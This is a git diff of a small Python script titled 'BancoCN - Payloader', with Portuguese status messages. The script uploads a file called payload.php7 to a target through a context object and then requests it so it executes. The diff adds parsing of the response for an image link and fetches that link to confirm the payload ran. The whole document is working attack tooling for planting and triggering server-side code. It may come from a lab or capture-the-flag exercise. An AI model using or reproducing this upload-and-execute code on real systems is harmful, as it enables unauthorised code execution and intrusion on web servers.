@@ -1,7 +1,8 @@
 from cn import Context
 from json import load
-from requests import get
+from requests import get, Session
 from utils import randomString
+from hpparser import findImg
 
 
 print("** BancoCN - Payloader")
@@ -22,5 +23,8 @@ print(" * Fazendo Upload")
 
 url = ctx.upload(randomString(8), 'payload.php7', open('payload.php7'))
 
-print(f" * Payloading... url={url}")
-get(url)
+print(f" * Payloading... url={url} didRun? ",end='', flush=True)
+
+get(findImg(get(url, timeout=30).text))
+print('ok')
+
